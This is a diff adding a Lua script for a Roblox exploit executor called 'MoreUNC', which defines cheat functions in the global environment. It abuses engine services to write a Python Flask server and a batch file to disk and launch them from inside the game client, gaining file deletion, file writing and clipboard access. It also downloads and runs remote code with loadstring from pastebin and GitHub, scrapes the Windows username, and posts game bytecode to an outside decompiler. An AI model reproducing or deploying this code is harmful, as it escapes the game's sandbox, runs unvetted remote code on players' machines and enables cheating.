@@ -1,0 +1,1175 @@
+
+
+for i, _ in next, getgenv() do 
+    if i ~= "loadstring" and i ~= "getgenv" then
+        getgenv()[i]=nil
+    end
+end
+
+local B = 2147483647 -- 32bit integer limit
+
+--^ Variables:
+
+local string, table, task, Instance, game, debug = string, table, task, Instance, workspace.Parent, debug
+
+local find, gsub, sub, rep, format, match, gmatch, split, byte, char = string.find, string.gsub, string.sub, string.rep, string.format, string.match, string.gmatch, string.split, string.byte, string.char
+local tfind, tinsert, tconcat, tunpack, tclear = table.find, table.insert, table.concat, table.unpack, table.clear
+local cwrap, cyield = coroutine.wrap, coroutine.yield
+local DEBUG_INFO = debug.info
+
+local Instance_new = Instance.new
+
+local UDim2_fromOffset = UDim2.fromOffset
+local deg, sqrt, atan2, random, clamp = math.deg, math.sqrt, math.atan2, math.random, math.clamp
+
+--& Lua(u) Globals
+
+local pcall, next, tostring, tonumber, assert, typeof, tick, setfenv, getfenv, setmetatable, error, newproxy = pcall, next, tostring, tonumber, assert, typeof, tick, setfenv, getfenv, setmetatable, error, newproxy
+local wait, spawn, delay = task.wait, task.spawn, task.delay
+
+--* Instances
+
+local HttpService = game:GetService("HttpService")
+local ScriptContext = game:GetService("ScriptContext")
+local LinkingService = game:GetService("LinkingService")
+local InsertService = game:GetService("InsertService")
+local UserInputService = game:GetService("UserInputService")
+local UGCValidationService = game:GetService("UGCValidationService")
+
+local VirtualInputManager = Instance_new("VirtualInputManager")
+
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+
+local LocalPlayer = Players.LocalPlayer
+local RobloxActive = true
+
+local Mouse = LocalPlayer:GetMouse()
+local Camera = workspace.CurrentCamera
+
+local HiddenUI = Instance_new("Folder")
+HiddenUI.Name = "HiddenUI" .. rep("\0", random(2, 10))
+
+local Keys = {
+    [0x08] = Enum.KeyCode.Backspace,
+    [0x09] = Enum.KeyCode.Tab,
+    [0x0C] = Enum.KeyCode.Clear,
+    [0x0D] = Enum.KeyCode.Return,
+    [0x10] = Enum.KeyCode.LeftShift,
+    [0x11] = Enum.KeyCode.LeftControl,
+    [0x12] = Enum.KeyCode.LeftAlt,
+    [0x13] = Enum.KeyCode.Pause,
+    [0x14] = Enum.KeyCode.CapsLock,
+    [0x1B] = Enum.KeyCode.Escape,
+    [0x20] = Enum.KeyCode.Space,
+    [0x21] = Enum.KeyCode.PageUp,
+    [0x22] = Enum.KeyCode.PageDown,
+    [0x23] = Enum.KeyCode.End,
+    [0x24] = Enum.KeyCode.Home,
+    [0x2D] = Enum.KeyCode.Insert,
+    [0x2E] = Enum.KeyCode.Delete,
+    [0x30] = Enum.KeyCode.Zero,
+    [0x31] = Enum.KeyCode.One,
+    [0x32] = Enum.KeyCode.Two,
+    [0x33] = Enum.KeyCode.Three,
+    [0x34] = Enum.KeyCode.Four,
+    [0x35] = Enum.KeyCode.Five,
+    [0x36] = Enum.KeyCode.Six,
+    [0x37] = Enum.KeyCode.Seven,
+    [0x38] = Enum.KeyCode.Eight,
+    [0x39] = Enum.KeyCode.Nine,
+    [0x41] = Enum.KeyCode.A,
+    [0x42] = Enum.KeyCode.B,
+    [0x43] = Enum.KeyCode.C,
+    [0x44] = Enum.KeyCode.D,
+    [0x45] = Enum.KeyCode.E,
+    [0x46] = Enum.KeyCode.F,
+    [0x47] = Enum.KeyCode.G,
+    [0x48] = Enum.KeyCode.H,
+    [0x49] = Enum.KeyCode.I,
+    [0x4A] = Enum.KeyCode.J,
+    [0x4B] = Enum.KeyCode.K,
+    [0x4C] = Enum.KeyCode.L,
+    [0x4D] = Enum.KeyCode.M,
+    [0x4E] = Enum.KeyCode.N,
+    [0x4F] = Enum.KeyCode.O,
+    [0x50] = Enum.KeyCode.P,
+    [0x51] = Enum.KeyCode.Q,
+    [0x52] = Enum.KeyCode.R,
+    [0x53] = Enum.KeyCode.S,
+    [0x54] = Enum.KeyCode.T,
+    [0x55] = Enum.KeyCode.U,
+    [0x56] = Enum.KeyCode.V,
+    [0x57] = Enum.KeyCode.W,
+    [0x58] = Enum.KeyCode.X,
+    [0x59] = Enum.KeyCode.Y,
+    [0x5A] = Enum.KeyCode.Z,
+    [0x5D] = Enum.KeyCode.Menu,
+    [0x60] = Enum.KeyCode.KeypadZero,
+    [0x61] = Enum.KeyCode.KeypadOne,
+    [0x62] = Enum.KeyCode.KeypadTwo,
+    [0x63] = Enum.KeyCode.KeypadThree,
+    [0x64] = Enum.KeyCode.KeypadFour,
+    [0x65] = Enum.KeyCode.KeypadFive,
+    [0x66] = Enum.KeyCode.KeypadSix,
+    [0x67] = Enum.KeyCode.KeypadSeven,
+    [0x68] = Enum.KeyCode.KeypadEight,
+    [0x69] = Enum.KeyCode.KeypadNine,
+    [0x6A] = Enum.KeyCode.KeypadMultiply,
+    [0x6B] = Enum.KeyCode.KeypadPlus,
+    [0x6D] = Enum.KeyCode.KeypadMinus,
+    [0x6E] = Enum.KeyCode.KeypadPeriod,
+    [0x6F] = Enum.KeyCode.KeypadDivide,
+    [0x70] = Enum.KeyCode.F1,
+    [0x71] = Enum.KeyCode.F2,
+    [0x72] = Enum.KeyCode.F3,
+    [0x73] = Enum.KeyCode.F4,
+    [0x74] = Enum.KeyCode.F5,
+    [0x75] = Enum.KeyCode.F6,
+    [0x76] = Enum.KeyCode.F7,
+    [0x77] = Enum.KeyCode.F8,
+    [0x78] = Enum.KeyCode.F9,
+    [0x79] = Enum.KeyCode.F10,
+    [0x7A] = Enum.KeyCode.F11,
+    [0x7B] = Enum.KeyCode.F12,
+    [0x90] = Enum.KeyCode.NumLock,
+    [0x91] = Enum.KeyCode.ScrollLock,
+    [0xBA] = Enum.KeyCode.Semicolon,
+    [0xBB] = Enum.KeyCode.Equals,
+    [0xBC] = Enum.KeyCode.Comma,
+    [0xBD] = Enum.KeyCode.Minus,
+    [0xBE] = Enum.KeyCode.Period,
+    [0xBF] = Enum.KeyCode.Slash,
+    [0xC0] = Enum.KeyCode.Backquote,
+    [0xDB] = Enum.KeyCode.LeftBracket,
+    [0xDD] = Enum.KeyCode.RightBracket,
+    [0xDE] = Enum.KeyCode.Quote
+}
+
+UserInputService.WindowFocused:Connect(function()
+    RobloxActive = true
+end)
+
+UserInputService.WindowFocusReleased:Connect(function()
+    RobloxActive = false
+end)
+
+local function internal_read(file)
+    local success, content = pcall(function()
+        return InsertService:GetLocalFileContents(format("rbxasset://%s", file))
+    end)
+
+    return success and content or ""
+end
+
+local JSONDecode = function(Text)
+    return HttpService:JSONDecode(Text)
+end
+
+local HTTP = {}
+
+local cloneref = cloneref or function(p1)
+    return p1
+end
+
+do
+    if not pcall(function()
+        HiddenUI.Parent = cloneref(CoreGui)
+    end) then
+        HiddenUI.Parent = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    end
+end
+
+USER = match(ScriptContext:SaveScriptProfilingData("", "_"), "C:\\Users\\(.-)\\")
+
+--^ Functions:
+
+local function run_batch(batch)
+    LinkingService:OpenUrl(ScriptContext:SaveScriptProfilingData(batch, "TEMP.bat"))
+end
+
+local function getthreadidentity() -- Taken from previous moreunc (MoreUNC v2.0.0)
+    local function try(f)
+        return function()
+            return pcall(f);
+        end
+    end
+
+	for i, v in next, ({
+		try(function() return game.Name end),
+		try(function() return game:GetService("CoreGui").Name end),
+		try(function() return game.DataCost end),
+		try(function() return Instance_new, "Player" end),
+		try(function() return game:GetService("CorePackages").Name end),
+		try(function() return Instance_new("SurfaceAppearance").TexturePack end),
+		try(function() Instance_new("MeshPart").MeshId = "" end)
+	}) do
+        if not v() then
+            return i - 1; -- Previous level because the current isnt available
+        end
+    end
+	
+    return 7;
+end
+
+local function request(Args) -- Args: {Url: string, Method: string, Headers: table | nil, Body: string | nil}
+    Args = Args or {};
+    local Url, Method, Headers, Body = Args.Url, Args.Method, Args.Headers, Args.Body
+
+    --! Assertions
+    assert(Url, "Missing request url.")
+    assert(Method, "Missing request method.")
+
+    --* Main Function
+
+    local Content = {}
+
+    HttpService:RequestInternal({
+        Url = Url,
+        Method = Method,
+        Headers = Headers,
+        Body = Body
+    }):Start(function(Success, Returned)
+        Content = Returned
+        Content.Success = Success
+    end)
+
+    repeat
+        wait()
+    until
+        Content.Success ~= nil
+
+    return Content;
+end
+
+local function httpget(a, b, c) -- url, nocache
+    if typeof(a) ~= "string" then -- instance?
+        a = b
+        b = c
+    end
+
+    if b then -- no cache
+        return request({Url = a, Method = "GET"}).Body
+    else
+        local Saved = HTTP[a] or request({Url = a, Method = "GET"}).Body
+
+        HTTP[a] = Saved
+        return Saved
+    end
+end
+
+local base64 = {
+	encode = function(data)
+		local letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+        local Part = gsub(data,
+            ".",
+            function(x)
+                local r, b = "", byte(x)
+                for i = 8, 1, -1 do
+                    r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and "1" or "0")
+                end
+                return r
+            end
+        ) .. "0000"
+        return gsub(
+            Part,
+            "%d%d%d?%d?%d?%d?",
+            function(x)
+                if (#x < 6) then
+                    return ""
+                end
+                local c = 0
+                for i = 1, 6 do
+                    c = c + (sub(x, i, i) == "1" and 2 ^ (6 - i) or 0)
+                end
+                return sub(letters, c + 1, c + 1)
+            end
+        ) .. ({"", "==", "="})[#data % 3 + 1]
+	end,
+	decode = function(data)
+		local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+		data = gsub(data, '[^'..b..'=]', '') -- [^base64_chars and =]
+
+		return (gsub(data, '.', function(x)
+			if x == '=' then return '' end
+			local r, f = '', (find(b, x) - 1)
+			for i = 6, 1, -1 do
+				r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0')
+			end
+			return r;
+		end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+			if #x ~= 8 then return '' end
+			local c = 0
+			for i = 1, 8 do
+				c = c + (sub(x, i, i) == '1' and 2^(8 - i) or 0)
+			end
+			return char(c)
+		end))
+	end
+}
+
+local HashLib = loadstring(httpget("https://pastebin.com/raw/iRDTgy7w", true))()
+local Sandbox, ReverseGet = loadstring(httpget("https://raw.githubusercontent.com/bbbbbbbbbbbbbb121/sandbox/refs/heads/main/latest.lua", true))()
+
+local NIL = {}
+local DrawingCache = {}
+
+game = Sandbox(game, {
+    HttpGet = httpget,
+    HttpGetAsync = httpget
+})
+workspace = Sandbox(workspace)
+script = Sandbox(script)
+
+Game = game
+Workspace = workspace
+
+game.DescendantRemoving:Connect(function(d)
+	tinsert(NIL, d)
+end)
+
+--* Bridge:
+
+local Bridge = {
+    Url = "http://localhost:8000/",
+    Connected = false,
+    Responses = {}
+};
+
+function Bridge:Connect()
+    if not Bridge.Connected then
+        repeat
+            local Response = request({
+                Url = Bridge.Url,
+                Method = "GET"
+            }).Body
+
+            wait(1) -- Polling because we dont have websockets :broken-heart:
+        until
+            Response == "Up"
+        Bridge.Connected = true
+    end
+end
+
+function Bridge:Send(Path, Data, NoEncode) -- /hi, {}
+    Bridge:Connect();
+    local Base64 = {};
+    if Data then
+        for i, v in next, Data do
+            Base64[i] = typeof(v) == "string" and not NoEncode and base64.encode(v) or v
+        end
+    end
+
+    local json = Data and HttpService:JSONEncode(Base64) or nil
+    local Response = Bridge.Responses[Path .. (Data and json or "")]
+
+    if Response then
+        return Response
+    end
+
+    Response = request({
+        Url = Bridge.Url .. Path,
+        Method = Data and "POST" or "GET",
+        Headers = Data and {
+            ["Content-Type"] = "application/json"
+        } or nil,
+        Body = json
+    }).Body
+
+    if sub(Response, 1, 15) == "<!doctype html>" then
+        error("Unable to send request to /" .. Path, 2)
+    end
+
+    Bridge.Responses[Path .. (Data and json or "")] = Response -- Cacheing
+    return Response
+end
+
+--* Starting the bridge:
+do
+    local BRIDGE_PYTHON = format([[from concurrent.futures import thread
+from flask import Flask, request, jsonify
+
+import os
+import json
+import string
+import random
+from itsdangerous import base64_decode
+import pyperclip
+
+import psutil
+
+UserHome = os.path.expanduser("~")
+DownloadPath = os.path.join(UserHome, "Downloads")
+ExecutorName = "MoreUNC"
+
+def GenerateId(length=6):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+def GetRobloxVersion():
+    RobloxPath = f"{UserHome}/AppData/Local/Roblox/Versions"
+    for Folder in os.listdir(RobloxPath):
+        FolderPath = os.path.join(RobloxPath, Folder)
+        if os.path.isdir(FolderPath) and "RobloxPlayerLauncher.exe" in os.listdir(FolderPath):
+            return Folder
+    return None
+
+def FindRobloxProcess():
+    for Process in psutil.process_iter(['name', 'exe']):
+        try:
+            if "roblox" in Process.info['name'].lower():
+                return Process.info['exe']
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            continue
+    return ""
+
+Process = FindRobloxProcess()
+
+#IsBloxstrap = "\\Local\\Bloxstrap" in Process
+RobloxFolder = "".join(a + "\\" for a in Process.split("\\")[:-1])
+
+Logs = f"{UserHome}/AppData/Local/Roblox/versions/{GetRobloxVersion()}/logs/"
+
+def GetWorkspace(FileName=""):
+    return os.path.join(DownloadPath, ExecutorName, "workspace", FileName)
+
+app = Flask(__name__)
+
+def Decrypt(Payload_ENCODED, Decode=False):
+    Payload = {}
+    
+    for i in Payload_ENCODED:
+        Value = Payload_ENCODED[i]
+        Value2 = isinstance(Value, str) and base64_decode(Value) or Value
+        Payload[i] = Decode and Value2 != Value and Value2.decode() or Value2
+        
+    return Payload
+
+@app.route('/')
+def Home():
+    """Home endpoint."""
+    return "Up"
+
+@app.route('/files', methods=["POST"])
+def ManageFiles():
+    """Handle file-related operations."""
+    Payload = Decrypt(request.get_json())
+    
+    FileName = Payload.get("file", "").decode()
+    FilePath = GetWorkspace(FileName)
+    IsFolder = Payload.get("folder", False)
+    Method = Payload.get("method", "").decode().lower()
+
+    try:
+        if Method == "delete":
+            if os.path.exists(FilePath):
+                if IsFolder and os.path.isdir(FilePath):
+                    os.rmdir(FilePath)
+                else:
+                    os.remove(FilePath)
+                return "File/Folder deleted successfully."
+            return "File/Folder does not exist."
+
+        elif Method == "create":
+            Content = Payload.get("content", "")
+            if IsFolder:
+                os.makedirs(FilePath, exist_ok=True)
+            else:
+                with open(FilePath, "wb") as File:
+                    File.write(Content)
+            return "File/Folder created successfully."
+
+        elif Method == "read":
+            if IsFolder:
+                return "Cannot read a folder."
+            if os.path.exists(FilePath):
+                with open(FilePath, "rb") as File:
+                    return File.read()
+            return "File not found."
+
+        elif Method == "list":
+            if os.path.exists(FilePath):
+                files = []
+                for file in os.listdir(FilePath):
+                    files.append(FilePath + file)
+                return json.dumps(files)
+            return "Directory not found."
+
+        elif Method == "check":
+            Exists = os.path.exists(FilePath)
+            IsDir = os.path.isdir(FilePath)
+            return "true" if (IsFolder and IsDir) or (not IsFolder and Exists and not IsDir) else "false"
+
+    except Exception as Error:
+        print("Error:",Error)
+        return "An error occurred while processing the request."
+
+
+@app.route('/functions', methods=["POST"])
+async def Functions():
+    Payload = Decrypt(request.get_json(), True)
+    Func = Payload.get("func", "").lower()
+
+    try:
+        if Func == "getcustomasset":
+            SourcePath = GetWorkspace(Payload["file"])
+            GeneratedId = GenerateId() + os.path.splitext(SourcePath)[1]
+            CustomPath = os.path.join(RobloxFolder, "content", "textures")
+            CustomFilePath = os.path.join(CustomPath, GeneratedId)
+
+            with open(SourcePath, "rb") as SourceFile:
+                with open(CustomFilePath, "wb") as CustomFile:
+                    CustomFile.write(SourceFile.read())
+
+            return f"rbxasset://textures/{GeneratedId}"
+        elif Func == "setclipboard":
+            pyperclip.copy(Payload.get("text"))
+
+        return "Invalid function."
+
+    except Exception as Error:
+        print("Error 2:", Error)
+        return "An error occurred while processing the function."
+
+if __name__ == "__main__":
+    app.run(host='localhost', port=8000)]])
+
+    -- hosting the server:
+    run_batch(format([[@echo off
+python --version >nul 2>&1
+if errorlevel 1 (
+    echo Python is not installed! Please install Python first.
+    pause
+)
+
+python %s
+]], ScriptContext:SaveScriptProfilingData(BRIDGE_PYTHON, "server.py")))
+    Bridge:Connect()
+    repeat wait() until Bridge.Connected
+end
+
+-- File System: Bridge
+
+local function makefolder(FolderPath)
+    assert(typeof(FolderPath) == "string", "Invalid argument #1 to 'makefolder', string expected, got " .. typeof(FolderPath))
+
+    Bridge:Send("files", {
+        folder = true,
+        file = FolderPath,
+        method = "create"
+    })
+end
+
+local function writefile(Name, Content)
+    assert(typeof(Name) == "string", "Invalid argument #1 to 'writefile', string expected, got " .. typeof(Name))
+    assert(typeof(Content) == "string", "Invalid argument #2 to 'writefile', string expected, got " .. typeof(Content))
+
+    Bridge:Send("files", {
+        folder = false,
+        content = Content,
+        file = Name,
+        method = "create"
+    })
+end
+
+local function delfile(Path)
+    return Bridge:Send("files", {
+        folder = false,
+        file = Path,
+        method = "delete"
+    })
+end
+
+local function delfolder(Path)
+    return Bridge:Send("files", {
+        folder = true,
+        file = Path,
+        method = "delete"
+    })
+end
+
+local function readfile(Path)
+    local f = Bridge:Send("files", {
+        file = Path,
+        method = "read"
+    })
+
+    if f == "File not found." then
+        error("File doesn't exist.", 2)
+    end
+
+    return f
+end
+
+local function listfiles(Path)
+    local files = HttpService:JSONDecode(Bridge:Send("files", {
+        file = Path,
+        method = "list"
+    }))
+
+    if files == "Failed to get files." then
+        error("Invalid file path", 2)
+    end
+
+    return files
+end
+
+local function isfile(Path)
+    return Bridge:Send("files", {
+        file = Path,
+        folder = false,
+        method = "check"
+    }) == "true"
+end
+
+local function isfolder(Path)
+    return Bridge:Send("files", {
+        file = Path,
+        folder = true,
+        method = "check"
+    }) == "true"
+end
+
+local function getcustomasset(Path)
+    return Bridge:Send("functions", {
+        func = "getcustomasset",
+        file = Path
+    })
+end
+
+local function iscclosure(fn)
+    return DEBUG_INFO(fn, "s") == "[C]"
+end
+
+local function islclosure(fn)
+    return DEBUG_INFO(fn, "s") ~= "[C]"
+end
+
+local function clonefunction(fn)
+    return function(...)
+        return fn(...)
+    end
+end
+
+local Debug = setmetatable({
+    getinfo = function(fn)
+        local i = {}
+        local np, isvrg = DEBUG_INFO(fn, "a")
+        i.what = islclosure(fn) and "Lua" or "C"
+        i.short_src = DEBUG_INFO(fn, "s")
+        i.source = DEBUG_INFO(fn, "s")
+        i.name = DEBUG_INFO(fn, "n")
+        i.func = typeof(fn) == "function" and fn or DEBUG_INFO(fn, "f")
+        i.numparams = np
+        i.is_vararg = isvrg and 1 or 0
+        i.currentline = DEBUG_INFO(fn, "l")
+
+        return i
+    end
+}, {
+    __index = debug
+})
+
+local function isourclosure(fn)
+    return islclosure(fn) and Debug.getinfo(fn).source == Debug.getinfo(function()end).source or (function()
+        for _, v in next, getfenv(0) do
+            if v == fn then
+                return true
+            end
+        end
+        return false
+    end)()
+end
+
+local function newcclosure(fn)
+	local shawarma = cwrap(function(...) -- haha get it because shawarma wrap
+		local b = {cyield()}
+		while true do
+			b={cyield(fn(tunpack(b)))}
+		end
+	end)
+
+    shawarma()
+	return shawarma
+end
+
+local function hash(t, a)
+    assert(typeof(t) == "string", "Invalid argument #1 to 'hash', string expected, got " .. typeof(t))
+    assert(typeof(a) == "string", "Invalid argument #2 to 'hash', string expected, got " .. typeof(a))
+
+    a = gsub(a, "-", "_")
+
+    local f = HashLib[a]
+
+    assert(f, "No algorithm found by the name '" .. a .. "'")
+
+    return f(t)
+end
+
+local function decompile(LuaScriptContainer) --> requires getscriptbytecode
+    assert(tfind({"ModuleScript", "LocalScript"}, LuaScriptContainer.ClassName), "Invalid argument #1 to 'decompile', LuaSourceContainer expected, got " .. LuaScriptContainer.ClassName)
+
+    return request({
+        Url = "http://api.plusgiant5.com/konstant/decompile",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "text/plain"
+        },
+        Body = getscriptbytecode(LuaScriptContainer)
+    }).Body
+end
+
+local function setclipboard(text)
+    assert(typeof(text) == "string", "Invalid argument #1 to 'setclipboard', string expected got " .. typeof(text))
+
+    spawn(Bridge.Send, Bridge, "functions", {
+        func = "setclipboard",
+        text = text
+    })
+end
+
+local Fonts = {
+	[0] = Enum.Font.Arial,
+	[1] = Enum.Font.BuilderSans,
+	[2] = Enum.Font.Gotham,
+	[3] = Enum.Font.RobotoMono
+}
+
+local function Create(Class, Properties)
+    local Object = Instance_new(Class);
+
+    for i, v in next, Properties do
+        Object[i] = ReverseGet(v) or v
+    end
+
+    return Object
+end
+
+local function gethui()
+    return Sandbox(HiddenUI)
+end
+
+local UI = Create("ScreenGui", {
+    Parent = gethui(),
+    Name = "Drawing | MoreUNC"
+})
+
+local Drawing = {
+	Fonts = {
+	    UI = 0,
+	    System = 1,
+	    Plex = 2,
+	    Monospace = 3,
+    },
+	new = function(Type)
+        local Object = Create("Frame", {
+            Visible = true,
+            Size = UDim2_fromOffset(0, 0),
+            BackgroundColor3 = Color3.new(0, 0, 0),
+            BackgroundTransparency = 1,
+            BorderSizePixel = 0,
+            ZIndex = 1,
+            Parent = UI
+        });
+
+        local self = {
+            Visible = Object.Visible,
+            Color = Object.BackgroundColor3,
+            Transparency = 1,
+            ZIndex = Object.ZIndex,
+            Remove = function() Object:Destroy() end
+        }
+
+        self.Destroy = self.Remove
+
+        local function Construct(Update, Defaults, Default, Readonly)
+            Readonly = Readonly or {}
+            local function inlined()
+                if not Default then
+                    Object.Visible = self.Visible
+                    Object.BackgroundColor3 = self.Color
+                    Object.BackgroundTransparency = 1 - self.Transparency
+                    Object.ZIndex = clamp(self.ZIndex, -B, B)
+                end
+
+                Update()
+            end
+
+            for i, v in next, Defaults do
+                self[i] = v
+            end
+
+            local proxy = newproxy(true)
+            local mt = getmetatable(proxy)
+
+            mt.__index = function(_, b)
+                return self[b]
+            end
+            mt.__newindex = function(_, Key, Value)
+                if tfind(Readonly, Key) then
+                    return;
+                end
+                self[Key] = Value
+                inlined()
+            end
+            mt.__metatable = "This metatable is protected."
+
+            tinsert(DrawingCache, {proxy=proxy, instance = Object})
+
+            return proxy
+        end
+
+        --* Line
+
+		if Type == 'Line' then
+			return Construct(function()
+                local from, to = self.From, self.To
+                local dX, dY = to.X - from.X, to.Y - from.Y
+
+                Object.Size = UDim2_fromOffset(sqrt(dX ^ 2 + dY ^ 2), self.Thickness)
+                Object.Position = UDim2_fromOffset(from.X, from.Y)
+                Object.Rotation = deg(atan2(dY, dX))
+            end, {
+                Thickness = 1,
+                From = Vector2.zero,
+                To = Vector2.zero
+            })
+		elseif Type == 'Square' then
+			local Stroke = Create("UIStroke", {
+                Parent = Object,
+                Color = self.Color,
+                Enabled = true,
+                Thickness = 1
+            })
+
+			return Construct(function()
+				Object.Size = UDim2.new(0, self.Size.X, 0, self.Size.Y)
+				Object.Position = UDim2.new(0, self.Position.X, 0, self.Position.Y)
+    
+				Stroke.Enabled = self.Filled
+				Stroke.Color = self.Color
+                Stroke.Thickness = self.Thickness
+			end, {
+                Size = Vector2.zero,
+                Position = Vector2.zero,
+
+                Filled = false,
+                Thickness = 1,
+                Transparency = 0
+            })
+		elseif Type == 'Circle' then
+			local Stroke = Create("UIStroke", {
+                Parent = Object,
+                Color = self.Color,
+                Enabled = true
+            })
+			Create("UICorner", {
+                Parent = Object,
+                CornerRadius = UDim.new(1, 0)
+            })
+
+			return Construct(function()
+					Object.Size = UDim2.fromScale(self.Radius, self.Radius)
+					Object.Position = UDim2.fromScale(self.Position.X, self.Position.Y)
+
+					Stroke.Enabled = not self.Filled
+    
+					Stroke.Color = self.Color
+                    Stroke.Thickness = self.Thickness
+			end, {
+                Thickness = 1,
+                NumSides = 0,
+                Radius = 1,
+
+                Filled = false,
+
+                Position = Vector2.zero
+            })
+		elseif Type == 'Text' then
+            Object:Destroy()
+			Object = Create("TextLabel", {
+                Parent = UI,
+                Visible = self.Visible,
+                Size = UDim2.fromOffset(0, 0),
+                BackgroundColor3 = self.Color,
+                BackgroundTransparency = 1 - self.Transparency,
+                BorderSizePixel = 0,
+                TextStrokeColor3 = self.Color,
+                TextStrokeTransparency = 1,
+                TextSize = self.Size,
+                TextWrapped = false
+            })
+
+			return Construct(function()
+					Object.Size = UDim2.fromOffset(self.Size * 3, self.Size / 2)
+					Object.Position = UDim2.fromOffset(self.Position.X, self.Position.Y)
+					Object.Text = self.Text
+
+					Object.Font = Fonts[self.Font]
+					Object.TextColor3 = self.Color
+					Object.BackgroundTransparency = 1 - self.Transparency
+
+					if self.Center then
+						Object.TextXAlignment = Enum.TextXAlignment.Center
+						Object.TextYAlignment = Enum.TextYAlignment.Center
+					else
+						Object.TextXAlignment = Enum.TextXAlignment.Left
+						Object.TextYAlignment = Enum.TextYAlignment.Top
+					end
+
+					Object.TextStrokeTransparency = self.Outline and 0 or 1
+					Object.TextStrokeColor3 = self.OutlineColor
+                    self.TextBounds = Object.TextBounds
+			end, {
+                Text = '',
+                Size = 0,
+                Center = false,
+                Outline = false,
+                OutlineColor = self.Color,
+                Position = Vector2.zero,
+                Font = 3
+            }, true, {"TextBounds"})
+		end
+end}
+
+local function isrenderobj(a)
+    for _, object in next, DrawingCache do
+		if object.proxy == a then
+			return true
+		end
+	end
+    return false
+end
+
+local function cleardrawcache()
+    for _, Object in next, DrawingCache do
+        Object.instance:Destroy()
+    end
+end
+
+local function getrenderproperty(a, b)
+    assert(isrenderobj(a), "Invalid argument #1 to 'getrenderproperty', render object expected, got " .. typeof(a))
+    return a[b]
+end
+
+local function setrenderproperty(a, b, c)
+    assert(isrenderobj(a), "Invalid argument #1 to 'setrenderproperty', render object expected, got " .. typeof(a))
+
+    a[b] = c
+end
+
+local function getscripthash(LuaScriptContainer)
+	assert(tfind({"ModuleScript", "LocalScript"}, LuaScriptContainer.ClassName), "Invalid argument #1 to 'decompile', LuaSourceContainer expected, got " .. LuaScriptContainer.ClassName)
+
+	return LuaScriptContainer:GetHash()
+end
+
+--* Input Functions
+
+local function iswindowactive()
+    return RobloxActive
+end
+
+--kb
+
+local function keypress(Key)
+    VirtualInputManager:SendKeyEvent(true, Keys[Key], false, game)
+end
+
+local function keyrelease(Key)
+    VirtualInputManager:SendKeyEvent(false, Keys[Key], false, game)
+end
+
+--mouse
+
+local function mouse1press()
+    VirtualInputManager:SendMouseButtonEvent(Mouse.X, Mouse.Y, 0, true, game, 0)
+end
+
+local function mouse1release()
+    VirtualInputManager:SendMouseButtonEvent(Mouse.X, Mouse.Y, 0, false, game, 0)
+end
+
+local function mouse1click()
+    mouse1press()
+    mouse1release()
+end
+
+local function mouse2press()
+    VirtualInputManager:SendMouseButtonEvent(Mouse.X, Mouse.Y, 1, true, game, 0)
+end
+
+local function mouse2release()
+    VirtualInputManager:SendMouseButtonEvent(Mouse.X, Mouse.Y, 1, false, game, 0)
+end
+
+local function mouse2click()
+    mouse2press()
+    mouse2release()
+end
+
+local function mousemoveabs(x, y) -- x: int, y: int
+    VirtualInputManager:SendMouseWheelEvent(x, y, false, game)
+end
+
+local function mousemoverel(x, y) -- x: float, y: float
+    mousemoveabs(Camera.ViewportSize.X * x, Camera.ViewportSize.Y * y)
+end
+
+--other
+
+local function getinstances()
+    return game:GetDescendants()
+end
+
+local function getnilinstances()
+    return NIL
+end
+
+local function getscripts()
+    local list = {}
+    for _, scr in next, getinstances() do
+        if scr:IsA("LocalScript") or scr:IsA("ModuleScript") then
+            tinsert(list, scr)
+        end
+    end
+
+    return list
+end
+
+local function getexecutorname()
+    return "MoreUNC", "3.0.0"
+end
+
+local function gethiddenproperty(a, b)
+    local Success, Value = pcall(function()
+        return UGCValidationService:GetPropertyValue(a, b)
+    end)
+
+    assert(Success, "Invalid argument #2 to 'gethiddenproperty', property is not a valid member of Instance")
+
+    return Value
+end
+
+local function getfflag(fflag)
+    local Success, Value = pcall(function()
+        return game:GetFastFlag(gsub(fflag, "FFlag", ""))
+    end)
+
+    assert(Success, "FFlag doesn't exist.")
+    return Value
+end
+
+local function SetEnvironment(Value)
+    for i, v in next, Value do
+        getgenv()[i] = v
+    end
+end
+
+SetEnvironment({
+    listfiles = listfiles,
+    readfile = readfile,
+    isfile = isfile,
+    isfolder = isfolder,
+    writefile = writefile,
+    makefolder = makefolder,
+    delfile = delfile,
+    delfolder = delfolder,
+
+    getsynasset = getcustomasset,
+    getcustomasset = getcustomasset,
+
+    clonefunction = clonefunction,
+    clonefunc = clonefunction,
+
+    iscclosure = iscclosure,
+    islclosure = islclosure,
+    isourclosure = isourclosure,
+    iskrnlclosure = isourclosure,
+    issynclosure = isourclosure,
+
+    newcclosure = newcclosure,
+
+    getthreadidentity = getthreadidentity,
+
+    crypt = {
+        hash = hash,
+        custom = {
+            hash = hash
+        },
+        base64 = base64,
+
+        base64_encode = base64.encode,
+        base64encode = base64.encode,
+    
+        base64_decode = base64.decode,
+        base64decode = base64.decode,
+    },
+    
+    base64 = base64,
+    base64_encode = base64.encode,
+    base64encode = base64.encode,
+    
+    base64_decode = base64.decode,
+    base64decode = base64.decode,
+
+    debug = Debug,
+
+    request = request,
+    http_request = request,
+    http = {
+        request = request
+    },
+
+    httpget = httpget,
+
+    decompile = decompile,
+
+    gethui = gethui,
+
+    game = game,
+    workspace = workspace,
+    script = script,
+    Game = Game,
+    Workspace = Workspace,
+
+    Drawing = Drawing,
+    cleardrawcache = cleardrawcache,
+    isrenderobj = isrenderobj,
+    getrenderproperty = getrenderproperty,
+    setrenderproperty = setrenderproperty,
+
+    setclipboard = setclipboard,
+    setrbxclipboard = setrbxclipboard,
+    writeclipboard = setclipboard,
+
+    mouse1press = mouse1press,
+    mouse1release = mouse1release,
+    mouse1click = mouse1click,
+
+    mouse2press = mouse2press,
+    mouse2release = mouse2release,
+    mouse2click = mouse2click,
+
+    mousemoveabs = mousemoveabs,
+    mousemoverel = mousemoverel,
+
+    keypress = keypress,
